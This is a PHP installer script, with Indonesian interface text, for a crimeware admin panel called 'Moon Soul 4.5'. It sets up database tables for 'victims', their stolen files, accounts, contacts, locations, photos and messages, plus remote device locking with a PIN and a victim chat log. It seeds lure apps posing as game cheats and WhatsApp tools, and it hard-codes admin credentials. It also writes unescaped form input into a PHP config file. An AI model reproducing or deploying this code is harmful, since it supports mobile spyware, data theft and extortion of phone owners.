<?php
session_start();
error_reporting(0);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Moon Soul 4.5 · Installer</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, system-ui, sans-serif;
        }
        body {
            background: #0a0f1e;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .install-box {
            background: #141b2b;
            max-width: 450px;
            width: 100%;
            border-radius: 40px;
            padding: 35px;
            box-shadow: 0 30px 60px rgba(0,0,0,0.5);
            border: 1px solid #1e2a3a;
        }
        h1 {
            color: #fff;
            font-size: 32px;
            margin-bottom: 10px;
            background: linear-gradient(135deg, #a855f7, #3b82f6);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .sub {
            color: #94a3b8;
            margin-bottom: 30px;
            border-left: 3px solid #a855f7;
            padding-left: 12px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            color: #cbd5e1;
            margin-bottom: 8px;
            font-size: 14px;
            font-weight: 500;
        }
        input {
            width: 100%;
            padding: 15px 18px;
            background: #1e293b;
            border: 1px solid #334155;
            border-radius: 20px;
            color: white;
            font-size: 15px;
        }
        input:focus {
            outline: none;
            border-color: #a855f7;
        }
        button {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #a855f7, #3b82f6);
            border: none;
            border-radius: 30px;
            color: white;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            transition: 0.3s;
        }
        button:hover {
            transform: translateY(-2px);
            opacity: 0.9;
        }
        .info {
            background: #1e293b;
            padding: 15px;
            border-radius: 20px;
            margin: 20px 0;
            color: #94a3b8;
            font-size: 13px;
            border: 1px solid #334155;
        }
        .success {
            background: #0f2b1d;
            color: #10b981;
            padding: 15px;
            border-radius: 20px;
            border: 1px solid #10b981;
        }
    </style>
</head>
<body>
    <div class="install-box">
        <h1>🌙 Moon Soul 4.5</h1>
        <div class="sub">⚡ Installer · Panel Admin</div>
        
        <?php
        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            $host = $_POST['host'];
            $dbname = $_POST['dbname'];
            $username = $_POST['username'];
            $password = $_POST['password'];
            
            try {
                $pdo = new PDO("mysql:host=$host", $username, $password);
                $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                
                $pdo->exec("CREATE DATABASE IF NOT EXISTS `$dbname`");
                $pdo->exec("USE `$dbname`");
                
                // Tabel admin
                $sql = "CREATE TABLE IF NOT EXISTS admin (
                    id INT AUTO_INCREMENT PRIMARY KEY,
                    username VARCHAR(50) UNIQUE NOT NULL,
                    password VARCHAR(255) NOT NULL,
                    code_login VARCHAR(50) UNIQUE NOT NULL
                )";
                $pdo->exec($sql);
                
                $hashedPass = password_hash('soul4.5', PASSWORD_DEFAULT);
                $stmt = $pdo->prepare("INSERT IGNORE INTO admin (username, password, code_login) VALUES (?, ?, ?)");
                $stmt->execute(['Moon4.5', $hashedPass, 'Cv27soul']);
                
                // Tabel victims
                $sql = "CREATE TABLE IF NOT EXISTS victims (
                    id INT AUTO_INCREMENT PRIMARY KEY,
                    device_id VARCHAR(100) UNIQUE NOT NULL,
                    device_name VARCHAR(255),
                    phone_number VARCHAR(20),
                    is_locked TINYINT DEFAULT 0,
                    lock_message TEXT,
                    lock_pin VARCHAR(10),
                    last_active TIMESTAMP NULL,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )";
                $pdo->exec($sql);
                
                // Tabel victim_data
                $sql = "CREATE TABLE IF NOT EXISTS victim_data (
                    id INT AUTO_INCREMENT PRIMARY KEY,
                    victim_id INT NOT NULL,
                    data_type ENUM('file','account','contact','location','photo','message') NOT NULL,
                    data_content TEXT,
                    file_path VARCHAR(255),
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (victim_id) REFERENCES victims(id) ON DELETE CASCADE
                )";
                $pdo->exec($sql);
                
                // Tabel chat_logs
                $sql = "CREATE TABLE IF NOT EXISTS chat_logs (
                    id INT AUTO_INCREMENT PRIMARY KEY,
                    victim_id INT NOT NULL,
                    message TEXT,
                    sender ENUM('admin','victim') DEFAULT 'admin',
                    is_read TINYINT DEFAULT 0,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (victim_id) REFERENCES victims(id) ON DELETE CASCADE
                )";
                $pdo->exec($sql);
                
                // Tabel fake_apks
                $sql = "CREATE TABLE IF NOT EXISTS fake_apks (
                    id INT AUTO_INCREMENT PRIMARY KEY,
                    name VARCHAR(100),
                    package_name VARCHAR(100),
                    description TEXT,
                    icon VARCHAR(255),
                    download_count INT DEFAULT 0,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )";
                $pdo->exec($sql);
                
                // Insert sample victims for demo
                $sampleVictims = [
                    ['IMEI123456', 'Samsung S23 Ultra', '081234567890'],
                    ['IMEI789012', 'iPhone 15 Pro', '085678901234'],
                    ['IMEI345678', 'Xiaomi 14 Pro', '087890123456']
                ];
                
                foreach ($sampleVictims as $victim) {
                    $stmt = $pdo->prepare("INSERT IGNORE INTO victims (device_id, device_name, phone_number, last_active) VALUES (?, ?, ?, NOW())");
                    $stmt->execute($victim);
                }
                
                // Insert fake APKs
                $apks = [
                    ['Aimlock Pro + Wallhack', 'com.aimlock.pro', 'Auto aim 100% work tanpa banned!', '🎯'],
                    ['Game Penghasil Uang', 'com.game.uang', 'Dapatkan saldo DANA setiap main', '💰'],
                    ['Unban WhatsApp Tools', 'com.unban.wa', 'Unban WA permanen 100% work', '✅'],
                    ['Bug WhatsApp Premium', 'com.bug.wa', 'Baca pesan tanpa centang biru', '🐛'],
                    ['Garena Free Fire Mod', 'com.freefire.mod', 'Aimbot + Auto headshot', '🔥'],
                    ['Mobile Legends Mod', 'com.ml.mod', 'Map hack + Drone view', '⚡']
                ];
                
                foreach ($apks as $apk) {
                    $stmt = $pdo->prepare("INSERT IGNORE INTO fake_apks (name, package_name, description, icon) VALUES (?, ?, ?, ?)");
                    $stmt->execute($apk);
                }
                
                // Buat file config
                if (!is_dir('config')) mkdir('config');
                
                $config = "<?php\n";
                $config .= "define('DB_HOST', '$host');\n";
                $config .= "define('DB_NAME', '$dbname');\n";
                $config .= "define('DB_USER', '$username');\n";
                $config .= "define('DB_PASS', '$password');\n";
                $config .= "?>";
                
                file_put_contents('config/database.php', $config);
                
                echo '<div class="success">✅ Database berhasil dibuat!<br><br>';
                echo '<a href="index.php" style="color:#10b981; font-weight:600;">➡ Login ke Panel Admin</a></div>';
                
            } catch(PDOException $e) {
                echo '<div style="background:#2b1a1a; color:#ef4444; padding:15px; border-radius:20px;">❌ Error: ' . $e->getMessage() . '</div>';
            }
        } else {
        ?>
        
        <div class="info">
            <strong>🔐 Kredensial Admin Default:</strong><br>
            • Username: <span style="color:#a855f7;">Moon4.5</span><br>
            • Password: <span style="color:#a855f7;">soul4.5</span><br>
            • Code Login: <span style="color:#a855f7;">Cv27soul</span><br>
            <span style="color:#f59e0b; display:block; margin-top:10px;">⚠️ HAPUS FILE install.php SETELAH INSTALL!</span>
        </div>
        
        <form method="POST">
            <div class="form-group">
                <label>📀 Host Database</label>
                <input type="text" name="host" value="localhost" required>
            </div>
            <div class="form-group">
                <label>💾 Nama Database</label>
                <input type="text" name="dbname" value="moonsoul_db" required>
            </div>
            <div class="form-group">
                <label>👤 Username Database</label>
                <input type="text" name="username" value="root" required>
            </div>
            <div class="form-group">
                <label>🔐 Password Database</label>
                <input type="password" name="password" placeholder="kosongin kalo default">
            </div>
            <button type="submit">🔥 INSTALL MOON SOUL 4.5</button>
        </form>
        
        <?php } ?>
    </div>
</body>
</html>
